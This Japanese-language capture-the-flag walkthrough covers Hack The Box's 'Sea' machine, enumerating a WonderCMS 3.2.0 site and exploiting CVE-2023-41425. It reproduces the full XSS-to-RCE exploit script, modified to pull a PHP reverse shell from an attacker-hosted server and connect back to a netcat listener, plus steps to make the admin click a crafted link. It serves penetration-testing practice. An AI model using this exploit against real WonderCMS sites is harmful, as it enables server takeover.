# Sea Walkthrough without Metasploit
LINK：[Sea Machine (Retired)](https://app.hackthebox.com/machines/620)


## Emuration
nmapAutomator.shを使って、開いているポートを自動列挙

```
INPUT:
./nmapAutomator.sh 10.129.184.11 All 
```

```
OUTPUT:
---------------------Starting Nmap Basic Scan---------------------

Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-11 19:59 JST
Nmap scan report for 10.129.184.11
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.63 seconds
```

<br>

ブラウザから `http://[ip]` にアクセス

```
INPUT:
 http://[ip]へアクセス
```

<br>

以下のコマンドを実行し、ディレクトリをスキャン

```
INPUT:
mkdir ffuf
ffuf -u "http://[ip]/FUZZ/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -ic -c -r -t 100 -fc 404 | tee ffuf/root.txt
```

```
OUTPUT:
                        [Status: 200, Size: 3680, Words: 582, Lines: 87, Duration: 368ms]
home                    [Status: 200, Size: 3680, Words: 582, Lines: 87, Duration: 371ms]
themes                  [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 186ms]
data                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 189ms]
plugins                 [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 183ms]
messages                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 184ms]
icons                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5940ms]
404                     [Status: 200, Size: 3371, Words: 530, Lines: 85, Duration: 204ms]
```

<br>

themesが怪しいので、さらに列挙

```
INPUT:
ffuf -u "http://10.129.184.11/themes/FUZZ/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -ic -c -r -t 100 -fc 404 | tee ffuf/root_themes.txt
```
```
OUTPUT:
                        [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 2167ms]
home                    [Status: 200, Size: 3680, Words: 582, Lines: 87, Duration: 6218ms]
404                     [Status: 200, Size: 3371, Words: 530, Lines: 85, Duration: 183ms]
%20                     [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 182ms]
bike                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 181ms]
video games             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 182ms]
4%20Color%2099%20IT2    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 181ms]
cable tv                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 181ms]
long distance           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 181ms]
```

<br>

bikeが怪しいので、さらに列挙
```
INPUT:
ffuf -u "http://10.129.184.11/themes/bike/FUZZ/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -ic -c -r -t 100 -fc 404 | tee ffuf/root_themes_bike.txt
```
```
OUTPUT:
                        [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 364ms]
img                     [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 355ms]
home                    [Status: 200, Size: 3680, Words: 582, Lines: 87, Duration: 375ms]
css                     [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 184ms]
404                     [Status: 200, Size: 3371, Words: 530, Lines: 85, Duration: 185ms]
%20                     [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 186ms]
video games             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 183ms]
4%20Color%2099%20IT2    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 185ms]
```

<br>

怪しい出力がないので、ファイルを検索する
```
INPUT:
ffuf -u "http://10.129.184.11/themes/bike/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -ic -c -r -t 100 -fc 404 | tee ffuf/general.txt
```
```
OUTPUT:
README.md               [Status: 200, Size: 318, Words: 40, Lines: 16, Duration: 187ms]
sym/root/home/          [Status: 200, Size: 3680, Words: 582, Lines: 87, Duration: 184ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 188ms]
:: Progress: [2565/2565] :: Job [1/1] :: 532 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

README.mdの中身を確認する
```
INPUT:
http://[ip]/themes/bike/README.md
```
```
OUTPUT:
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```

versionの中身を見る
```
INPUT:
http://[ip]/themes/bike/version
```
```
OUTPUT:
3.2.0
```

**結論：WonderCMS 3.2.0 が使われているとわかった。**


## Vulnerability Search
Googleで「WonderCMS 3.2.0 exploit」などで調べると、https://github.com/prodigiousMind/CVE-2023-41425 が見つかる。どうやら、XSSの脆弱性があるらしい。このコードを使って、リバースシェルを獲得していく。

## Exploit
exploit.pyコードを見ると、修正すべき箇所が見つかる。
```{r, attr.source='.numberLines'}
# Author: prodigiousMind
# Exploit: Wondercms 4.3.2 XSS to RCE


import sys
import requests
import os
import bs4

if (len(sys.argv)<4): print("usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252")
else:
  data = '''
var url = "'''+str(sys.argv[1])+'''";
if (url.endsWith("/")) {
 url = url.slice(0, -1);
}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
   xhr4.send();
   xhr4.onload = function() {
     if (xhr4.status == 200) {
       var ip = "'''+str(sys.argv[2])+'''";
       var port = "'''+str(sys.argv[3])+'''";
       var xhr5 = new XMLHttpRequest();
       xhr5.withCredentials = true;
       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
       xhr5.send();
       
     }
   };
 }
};
'''
  try:
    open("xss.js","w").write(data)
    print("[+] xss.js is created")
    print("[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp "+str(sys.argv[3]))
    print("----------------------------\n")
    XSSlink = str(sys.argv[1]).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(sys.argv[2])+":8000/xss.js\"></script><form+action=\""
    XSSlink = XSSlink.strip(" ")
    print("send the below link to admin:\n\n----------------------------\n"+XSSlink)
    print("----------------------------\n")

    print("\nstarting HTTP server to allow the access to xss.js")
    os.system("python3 -m http.server\n")
  except: print(data,"\n","//write this to a file")
  ```

20行目にphpリバースシェルが格納されたリポジトリが設定されているが、ターゲットPCはネットワークに繋がっていないため、このリポジトリにアクセスできない。exploit.pyと同じディレクトリに、PHPリバースシェルを予めダウンロードしておく。

```
PHPリバースシェルのダウンロード:
wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
```
コードの修正
```
修正前：
var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
```
```
修正後：
var urlRev = urlWithoutLogBase+"/?installModule=http://[attacker_ip]:8000/main.zip&directoryName=violet&type=themes&token=" + token;

```

<br>

18行目の `urlWithoutLogBase` もおかしい。
`urlWithoutLogBase` は、20行目で `urlRev` に使われて、最終的に23行目の `xhr3.open("GET", urlRev);` でリクエストが実行される際に使われる。

このままのコードをでは、urlRevにはパスのみが記載され、自動的にローカルドメインにアクセスしています。今回アクセスしてほしいのは、`http://sea.htb` なので書き換える。

```
修正前：
var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
```
```
修正後：
var urlWithoutLogBase = "http://sea.htb"; 
```

<br>

exploit.pyを実行
```
INPUT:
python exploit.py http://sea.htb/loginURL [attacker ip] 4444 
```
※ ターゲットのURLには、必ずドメイン（sea.htb）を用いること。（IPアドレスを指定してはならない）

<br>

exploit.pyの出力内容に従い、ncコマンドを実行する。

```
INPUT:
rlwrap nc -nlvp 4444
```

<br>

exploit.pyの出力内容に従い、adminユーザにリンクを踏ませる。

```
INPUT:
http://sea.htb/contact.php の Website欄にリンクを貼り、submitする。
他の欄は適当に埋める。
```

<br>

1分程度経過後、リバースシェルを獲得する




## 引用
https://j1ndosh.github.io/Hack-The-Box/Machines/Season-6/Sea

